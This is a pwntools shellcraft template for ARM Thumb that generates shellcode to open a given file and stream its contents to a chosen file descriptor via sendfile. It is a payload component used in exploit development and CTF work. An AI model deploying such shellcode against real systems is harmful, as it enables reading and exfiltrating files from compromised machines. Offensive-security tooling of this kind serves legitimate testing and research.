<% 
    from pwnlib.shellcraft import thumb
    from pwnlib.util.net import sockaddr
%>
<%page args="path, dst = 'r6'"/>
<%docstring>
Args: [path, dst (imm/reg) = r6 ]
    Opens the specified file path and sends its content to the specified file descriptor.
    Leaves the destination file descriptor in r6 and the input file descriptor in r5.
</%docstring>
    /* Save dst fd for later */
    ${thumb.mov('r6', dst)}

    ${thumb.pushstr(path)}

    ${thumb.syscall('SYS_open', 'sp', 'O_RDONLY')}

    /* Save src fd for later */
    ${thumb.mov('r5', 'r0')}

    /* Allocate room for struct stat */
    sub sp, sp, #88

    ${thumb.syscall('SYS_fstat64', 'r0', 'sp')}

    /* Load file size into r3 */
    ldr r3, [sp, #48]

    ${thumb.syscall('SYS_sendfile', 'r6', 'r5', 0, 'r3')}
